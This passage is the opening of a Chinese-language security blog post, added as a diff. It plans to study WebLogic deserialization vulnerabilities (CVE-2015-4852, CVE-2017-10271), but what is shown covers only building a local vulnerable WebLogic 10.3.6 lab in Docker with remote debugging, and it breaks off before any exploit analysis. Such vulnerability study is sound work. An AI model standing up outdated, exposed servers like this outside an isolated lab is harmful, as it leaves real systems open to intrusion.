@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Weblogic学习(1) - 6s6&#39;s blog</title><meta name="author" content="6s6">
+<meta name="description" content="description is here"><meta name="keywords" content='Java'>
+  <meta itemprop="name" content="Weblogic学习(1)">
+  <meta itemprop="description" content="description is here">
+  <meta itemprop="datePublished" content="2025-05-11T14:18:27+08:00">
+  <meta itemprop="dateModified" content="2025-05-11T14:18:27+08:00">
+  <meta itemprop="wordCount" content="1899">
+  <meta itemprop="keywords" content="Java"><meta property="og:url" content="http://localhost:1313/posts/705d533/">
+  <meta property="og:site_name" content="6s6&#39;s blog">
+  <meta property="og:title" content="Weblogic学习(1)">
+  <meta property="og:description" content="description is here">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-11T14:18:27+08:00">
+    <meta property="article:modified_time" content="2025-05-11T14:18:27+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Weblogic学习(1)">
+  <meta name="twitter:description" content="description is here">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/705d533/" title="Weblogic学习(1) - 6s6&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/816babd/" title="SpringAOP链学习" /><link rel="next" type="text/html" href="http://localhost:1313/posts/0846c48/" title="Weblogic学习(2)" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/705d533/index.md" title="Weblogic学习(1) - 6s6's blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Weblogic学习(1)",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/705d533\/"
+    },"genre": "posts","keywords": "Java","wordcount":  1899 ,
+    "url": "http:\/\/localhost:1313\/posts\/705d533\/","datePublished": "2025-05-11T14:18:27+08:00","dateModified": "2025-05-11T14:18:27+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "6s6"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Weblogic学习(1)</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://bu.dusays.com/2024/12/26/676d23907280d.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2025-05-11 14:18:27"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-11">2025-05-11</time></span>&nbsp;<span title="1899 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 9 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#weblogic-t3-反序列化cve-2015-4852">WebLogic T3 反序列化（CVE-2015-4852）</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞复现">漏洞复现</a>
+          <ul>
+            <li><a href="#weblogic请求分析">WebLogic请求分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞分析">漏洞分析</a></li>
+        <li><a href="#漏洞修复">漏洞修复</a></li>
+        <li><a href="#小结">小结</a></li>
+        <li><a href="#参考">参考</a></li>
+      </ul>
+    </li>
+    <li><a href="#weblogic-xmldecoder反序列化cve-2017-10271">WebLogic XMLDecoder反序列化（CVE-2017-10271）</a>
+      <ul>
+        <li><a href="#前置学习">前置学习</a>
+          <ul>
+            <li><a href="#xmlencoder-和-xmldecoder">XMLEncoder 和 XMLDecoder</a>
+              <ul>
+                <li><a href="#demo">demo</a>
+                  <ul>
+                    <li><a href="#encoder">Encoder</a></li>
+                    <li><a href="#decoder">Decoder</a></li>
+                  </ul>
+                </li>
+                <li><a href="#xml基础属性">XML基础属性</a>
+                  <ul>
+                    <li><a href="#string-标签">string 标签</a></li>
+                    <li><a href="#object-标签">object 标签</a></li>
+                    <li><a href="#void-标签">void 标签</a></li>
+                    <li><a href="#array标签">array标签</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#利用条件">利用条件</a></li>
+        <li><a href="#漏洞分析-1">漏洞分析</a>
+          <ul>
+            <li><a href="#原理解析">原理解析</a></li>
+            <li><a href="#漏洞复现-1">漏洞复现</a></li>
+            <li><a href="#代码分析">代码分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞修复-1">漏洞修复</a>
+          <ul>
+            <li><a href="#cve-2017-3506-补丁分析">CVE-2017-3506 补丁分析</a></li>
+            <li><a href="#cve-2017-10271-补丁分析">CVE-2017-10271 补丁分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#小结-1">小结</a></li>
+        <li><a href="#参考-1">参考</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="前言" class="heading-element"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>最近在学 Java 相关框架的漏洞，先从 Weblogic 开始，先从最熟悉的反序列化开始，之后再学习其他利用，之后的文章都是 10.3.6.0 版本的 Weblogic ，环境搭建全用 T3 的就好了</p>
+<h2 id="weblogic-t3-反序列化cve-2015-4852" class="heading-element"><span>WebLogic T3 反序列化（CVE-2015-4852）</span>
+  <a href="#weblogic-t3-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96cve-2015-4852" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="简介" class="heading-element"><span>简介</span>
+  <a href="#%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>WebLogic 是 Oracle 公司提供的一个<strong>Java EE 应用服务器</strong>，全名是 <strong>Oracle WebLogic Server</strong>，主要用于部署、运行 Java Web 应用（如 JSP、Servlet、EJB、Spring 等）。</p>
+<p>相较于Tomcat，WebLogic更适合大型项目和开发环境</p>
+<p>T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。</p>
+<p>在 T3 的这个协议里面包含请求包头和请求的主体这两部分内容。</p>
+<h3 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>用docker搭建，用qax的搭建脚本：https://github.com/QAX-A-Team/WeblogicEnvironment</p>
+<p>先下个 jdk7u21，再来个其对于版本的 Weblogic 安装包，1036 的 generic 版本，然后把下好的 JDK 和 Weblogic 然后分别放在WeblogicEnvironment 的 jdks 和 weblogics 中</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/04/24/6809f1d14c589.png" alt="image-20250424160954281" srcset="https://bu.dusays.com/2025/04/24/6809f1d14c589.png?size=small, https://bu.dusays.com/2025/04/24/6809f1d14c589.png?size=medium 1.5x, https://bu.dusays.com/2025/04/24/6809f1d14c589.png?size=large 2x" data-title="image-20250424160954281" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>改下 Dockerfile</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="c"># 基础镜像</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> centos:centos7</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 参数</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ARG</span> JDK_PKG<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ARG</span> WEBLOGIC_JAR<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 解决libnsl包丢失的问题</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># RUN yum -y install libnsl</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 创建用户</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> groupadd -g <span class="m">1000</span> oinstall <span class="o">&amp;&amp;</span> useradd -u <span class="m">1100</span> -g oinstall oracle<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 创建需要的文件夹和环境变量</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir -p /install <span class="o">&amp;&amp;</span> mkdir -p /scripts<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENV</span> <span class="nv">JDK_PKG</span><span class="o">=</span><span class="nv">$JDK_PKG</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENV</span> <span class="nv">WEBLOGIC_JAR</span><span class="o">=</span><span class="nv">$WEBLOGIC_JAR</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 复制脚本</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/jdk_install.sh /scripts/jdk_install.sh <span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/jdk_bin_install.sh /scripts/jdk_bin_install.sh <span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/weblogic_install11g.sh /scripts/weblogic_install11g.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/weblogic_install12c.sh /scripts/weblogic_install12c.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/create_domain11g.sh /scripts/create_domain11g.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/create_domain12c.sh /scripts/create_domain12c.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> scripts/open_debug_mode.sh /scripts/open_debug_mode.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> jdks/<span class="nv">$JDK_PKG</span> .<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> weblogics/<span class="nv">$WEBLOGIC_JAR</span> .<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 判断jdk是包（bin/tar.gz）weblogic包（11g/12c）载入对应脚本</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="k">if</span> <span class="o">[</span> <span class="nv">$JDK_PKG</span> <span class="o">==</span> *.bin <span class="o">]</span> <span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> ****载入JDK bin安装脚本**** <span class="o">&amp;&amp;</span> cp /scripts/jdk_bin_install.sh /scripts/jdk_install.sh <span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> ****载入JDK tar.gz安装脚本**** <span class="p">;</span> <span class="k">fi</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="k">if</span> <span class="o">[</span> <span class="nv">$WEBLOGIC_JAR</span> <span class="o">==</span> *1036* <span class="o">]</span> <span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> ****载入11g安装脚本**** <span class="o">&amp;&amp;</span> cp /scripts/weblogic_install11g.sh /scripts/weblogic_install.sh <span class="o">&amp;&amp;</span> cp /scripts/create_domain11g.sh /scripts/create_domain.sh <span class="p">;</span> <span class="k">else</span> <span class="nb">echo</span> ****载入12c安装脚本**** <span class="o">&amp;&amp;</span> cp /scripts/weblogic_install12c.sh /scripts/weblogic_install.sh <span class="o">&amp;&amp;</span> cp /scripts/create_domain12c.sh /scripts/create_domain.sh  <span class="p">;</span> <span class="k">fi</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 脚本设置权限及运行</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod +x /scripts/jdk_install.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod +x /scripts/weblogic_install.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod +x /scripts/create_domain.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod +x /scripts/open_debug_mode.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 安装JDK</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> /scripts/jdk_install.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 安装weblogic</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> /scripts/weblogic_install.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 创建Weblogic Domain</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> /scripts/create_domain.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 打开Debug模式</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> /scripts/open_debug_mode.sh<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 启动 Weblogic Server</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># CMD [&#34;tail&#34;,&#34;-f&#34;,&#34;/dev/null&#34;]</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh&#34;</span><span class="p">]</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 7001</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果说找不到 <code>weblogic_install.sh</code> ，那就把 <code>.gitignore</code> 文件最后的 <code>weblogics/</code> 去掉</p>
+<p>如果遇到说内存不足，那就在配置文件 <code>docker.service</code> 的 <code>ExecStart</code> 配置后面加上 <code>--default-ulimit nofile=65536:65536</code></p>
+<p>然后访问 <code>http://192.168.2.128:7001/console/login/LoginForm.jsp</code> 即可</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204172a167d.png" alt="image-20250424170146866" srcset="https://bu.dusays.com/2025/05/11/68204172a167d.png?size=small, https://bu.dusays.com/2025/05/11/68204172a167d.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204172a167d.png?size=large 2x" data-title="image-20250424170146866" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后设置下远程调试，需要把一些weblogic的依赖Jar包给导出来才能进行远程调试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir ./middleware
+</span></span><span class="line"><span class="cl">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/
+</span></span><span class="line"><span class="cl">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/
+</span></span><span class="line"><span class="cl">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./middleware/</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后用 IDEA 打开 wlserver 文件夹，导入 coherence_3.7/lib 和 modules</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820417492726.png" alt="image-20250424172622511" srcset="https://bu.dusays.com/2025/05/11/6820417492726.png?size=small, https://bu.dusays.com/2025/05/11/6820417492726.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820417492726.png?size=large 2x" data-title="image-20250424172622511" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>把 server/lib 也作为依赖进行导入</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820417457244.png" alt="image-20250424172744777" srcset="https://bu.dusays.com/2025/05/11/6820417457244.png?size=small, https://bu.dusays.com/2025/05/11/6820417457244.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820417457244.png?size=large 2x" data-title="image-20250424172744777" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后添加远程 JVM 调试</p>
